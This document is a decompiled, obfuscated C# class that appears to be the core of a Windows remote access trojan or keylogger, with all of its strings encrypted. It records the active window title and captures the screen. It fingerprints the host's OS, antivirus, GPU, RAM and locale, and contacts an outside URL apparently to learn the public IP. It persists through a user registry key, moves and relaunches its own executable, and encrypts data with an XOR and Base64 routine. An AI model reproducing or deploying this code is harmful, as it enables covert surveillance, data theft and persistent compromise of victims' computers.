using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class12
{
	public delegate void Delegate2(string string_0, out Mutex mutex_0);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	private class Class13
	{
		public uint uint_0;

		public uint uint_1;

		public ulong ulong_0;

		public ulong ulong_1;

		public ulong ulong_2;

		public ulong ulong_3;

		public ulong ulong_4;

		public ulong ulong_5;

		public ulong ulong_6;

		public Class13()
		{
			uint_0 = (uint)Marshal.SizeOf((object)this);
		}
	}

	private static string string_0;

	public static string String_0
	{
		get
		{
			return string_0;
		}
		set
		{
			string_0 = value;
		}
	}

	public static void smethod_0()
	{
		new Thread(smethod_1).Start();
	}

	private static void smethod_1()
	{
		uint uint_ = RegisterWindowMessage(_003CModule_003E.smethod_0("\u07bfބރޡނފފވޟޤރޞޙތރގވ", 2029));
		while (true)
		{
			PostMessage(65535, uint_, (IntPtr)Process.GetCurrentProcess().Id, IntPtr.Zero);
			Thread.Sleep(1000);
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool PostMessage(int int_0, uint uint_0, IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern uint RegisterWindowMessage(string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA(string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_1);

	public static T smethod_2<T>(string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(string_1.Split(new char[1] { ':' })[0]), string_1.Split(new char[1] { ':' })[1]), typeof(T));
	}

	public static bool smethod_3(string string_1)
	{
		if (Assembly.GetExecutingAssembly().Location.ToLower() == string_1.ToLower())
		{
			return true;
		}
		return false;
	}

	public static string smethod_4()
	{
		return Assembly.GetExecutingAssembly().Location;
	}

	public static bool smethod_5(ref string string_1)
	{
		string text = new string('\0', 100);
		GetWindowText(GetForegroundWindow(), text, 100);
		text = text.Substring(0, text.IndexOf('\0'));
		if (string_0 != text)
		{
			string_1 = text;
			string_0 = string_1;
			return true;
		}
		return false;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(int int_0, string string_1, int int_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint GetModuleFileName([In] IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll")]
	private static extern void ExitProcess(uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool MoveFileEx(string string_1, string string_2, long long_0);

	public static void smethod_6(string string_1, string string_2)
	{
		if (File.Exists(string_1))
		{
			File.Delete(string_1);
		}
		string location = Assembly.GetExecutingAssembly().Location;
		StringBuilder stringBuilder = new StringBuilder(location);
		MoveFileEx(location.Substring(0, (int)GetModuleFileName(IntPtr.Zero, stringBuilder, stringBuilder.Capacity)), string_1, 8L);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			Arguments = string_2,
			FileName = string_1
		};
		process.Start();
		ExitProcess(0u);
	}

	public static string smethod_7()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(_003CModule_003E.smethod_0("ԙԅԅԁՋ՞՞ԐԄԅԞԜԐԅԘԞԟ՟ԆԙԐԅԘԂԜԈԘԁ՟ԒԞԜ՞ԟՁՈՃՂՁՈՅՄ՟ԐԂԁ", 1393));
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("⛜⛧⛢⛧⛦⛾⛧", 9865);
		}
	}

	public static void smethod_8(string string_1, string string_2)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("\u0bc3\u0bdf\u0bd6\u0bc4\u0bc7\u0bd1\u0bc2\u0bd5\u0bcc\u0bdd௹௳\u0be2\u0bff\u0be3\u0bff௶\u0be4\u0bcc\u0bc7௹\u0bfe௴\u0bff௧\u0be3\u0bcc\u0bd3\u0be5\u0be2\u0be2௵\u0bfe\u0be4\u0bc6௵\u0be2\u0be3௹\u0bff\u0bfe\u0bcc\u0bc2\u0be5\u0bfe", 2960));
		registryKey.OpenSubKey(_003CModule_003E.smethod_0("ణ\u0c3fశతధఱఢవబఽఙఓ\u0c02ట\u0c03టఖ\u0c04బధఙఞఔటఇ\u0c03బళఅ\u0c02\u0c02కఞ\u0c04దక\u0c02\u0c03ఙటఞబఢఅఞ", 3184), writable: true);
		registryKey.SetValue(string_1, string_2);
	}

	public static string smethod_9(int int_0, int int_1)
	{
		int num = new Random((int)DateTime.Now.Ticks).Next(int_0, int_1);
		string text = _003CModule_003E.smethod_0("ηαΣδβογίΩζΧε\u03a2ΠΡήάέΪμξΥΰΤΨΫΗΑ\u0383ΔΒΟΓΏΉΖ·Ε\u0382\u0380\u0381ΎΌ\u038dΊΜΞ\u0385ΐ\u0384Έ\u038bϷϴϵϲϳϰϱϾϿ϶", 966);
		Random random = new Random((int)(DateTime.Now.Ticks * -1L));
		smethod_10(text.ToCharArray());
		char[] array = new char[num];
		for (int i = 0; i < num; i++)
		{
			array[i] = text[(int)((double)text.Length * random.NextDouble())];
		}
		return new string(array);
	}

	private static T[] smethod_10<T>(T[] gparam_0)
	{
		SortedList sortedList = new SortedList();
		Random random = new Random();
		for (int i = 0; i <= gparam_0.GetUpperBound(0); i++)
		{
			int num = random.Next();
			while (sortedList.ContainsKey(num))
			{
				num = random.Next();
			}
			sortedList.Add(num, gparam_0[i]);
		}
		T[] array = new T[gparam_0.Length];
		sortedList.Values.CopyTo(array, 0);
		return array;
	}

	public static string smethod_11()
	{
		return DateTime.Now.ToString(_003CModule_003E.smethod_0("⇹⇹↋⇜⇜↋⇂⇂↑⇕⇕↞⇼⇼↞⇈⇈⇈⇈", 8625));
	}

	public static void smethod_12(string string_1)
	{
		try
		{
			Thread.Sleep(5000);
			Mutex.OpenExisting(string_1);
			Application.Exit();
		}
		catch (Exception)
		{
			new Mutex(initiallyOwned: false, string_1);
		}
	}

	public static Image smethod_13()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	public static string smethod_14()
	{
		try
		{
			string englishName = CultureInfo.CurrentCulture.EnglishName;
			return englishName.Substring(englishName.IndexOf('(') + 1, englishName.LastIndexOf(')') - englishName.IndexOf('(') - 1);
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ப\u0b91ஔ\u0b91ஐஈ\u0b91", 3071);
		}
	}

	public static string smethod_15()
	{
		try
		{
			string englishName = CultureInfo.CurrentCulture.EnglishName;
			return englishName.Remove(englishName.IndexOf(_003CModule_003E.smethod_0("ḽḵ", 7709)));
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ᒻᒀᒅᒀᒁᒙᒀ", 5358);
		}
	}

	public static byte[] smethod_16(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[byte_0.Length + 1];
		byte b = (byte)new Random((int)DateTime.Now.Ticks).Next(1, 255);
		int num = array.Length - 2;
		for (int i = 0; i <= num; i++)
		{
			array[i] = (byte)(byte_0[i] ^ ((int)(byte)(byte_1[i % (int)(byte)byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		array[^1] = b;
		return Encoding.Default.GetBytes(Convert.ToBase64String(array));
	}

	public static byte[] smethod_17(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = Convert.FromBase64String(Encoding.Default.GetString(byte_0));
		byte[] array2 = new byte[array.Length - 2 + 1];
		byte b = array[^1];
		int num = array2.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			array2[i] = (byte)(array[i] ^ ((int)(byte)(byte_1[i % byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		return array2;
	}

	public static string smethod_18()
	{
		if (8 != IntPtr.Size && string.IsNullOrEmpty(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ᴁᴃᴞᴒᴔᴂᴂᴞᴃᴎᴐᴃᴒᴙᴘᴅᴔᴆᵧᵥᵢᵣ", 7505))))
		{
			return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ἩἋ\u1f16\u1f1eἋἘἔἿἐἕἜἊ", 8057));
		}
		return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ᘞᘼᘡᘩᘼᘯᘣᘈᘧᘢᘫᘽᙦᘶᙶᙸᙧ", 5710));
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GlobalMemoryStatusEx([In][Out] Class13 class13_0);

	public static string smethod_19()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("\u0b4f\u0b59\u0b50\u0b59ୟ\u0b48\u0b3cୟ\u0b7d୬୨୵୳୲\u0b3c\u0b5a\u0b4e\u0b53\u0b51\u0b3c\u0b4b୵୲ଯମ\u0b43\u0b53୬\u0b79୮\u0b7d୨୵୲\u0b7b\u0b4f\u0b65୯୨\u0b79ୱ", 2844));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("ኽኟ\u128eኊኗኑነ", 4862)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ᝰᝋᝎᝋᝊ\u1752ᝋ", 5925);
		}
	}

	public static ulong smethod_20()
	{
		try
		{
			Class13 @class = new Class13();
			if (GlobalMemoryStatusEx(@class))
			{
				return @class.ulong_0;
			}
			return 0uL;
		}
		catch (Exception)
		{
			return 0uL;
		}
	}

	public static string smethod_21()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("ऐआएआ\u0900ग\u0963ऌऐ\u0902ऱठफपषदठषशऱद\u0963अऑऌऎ\u0963औपभ॰ॱजऌळदऱढषपभतऐ\u093aरषदम", 2371));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("\u0bba\u0ba6ழஇ\u0b96\u0b9dஜ\u0b81ஐ\u0b96\u0b81\u0b80இஐ", 3061)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("၏\u1074\u1071\u1074ၵ\u106d\u1074", 4122);
		}
	}

	public static string smethod_22()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("৺৬\u09e5৬৪৽উ৺\u09cc\u09db\u09c0\u09c8\u09c5১ড়\u09c4\u09cb\u09cc\u09dbউ৯৻০\u09e4উ\u09fe\u09c0\u09c7চছ৶০\u09d9\u09cc\u09db\u09c8ঢ়\u09c0\u09c7ৎ৺\u09d0\u09daঢ়\u09cc\u09c4", 2473));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("ǥǓǄǟǗǚǸǃǛǔǓǄ", 438)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("໐\u0eeb\u0eee\u0eeb\u0eea\u0ef2\u0eeb", 3717);
		}
	}

	public static byte[] smethod_23(string string_1)
	{
		IntPtr moduleHandleA = GetModuleHandleA(string_1);
		IntPtr intptr_ = FindResource(moduleHandleA, _003CModule_003E.smethod_0("⋚", 8938), _003CModule_003E.smethod_0("⌔⌒⌙⌔⌅⌂⌇⌒⌇", 9030));
		IntPtr source = LoadResource(moduleHandleA, intptr_);
		int num = SizeofResource(moduleHandleA, intptr_);
		byte[] array = new byte[num];
		Marshal.Copy(source, array, 0, num);
		return array;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_1, string string_2);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandleA(string string_1);

	[DllImport("kernel32.dll")]
	private static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);
}
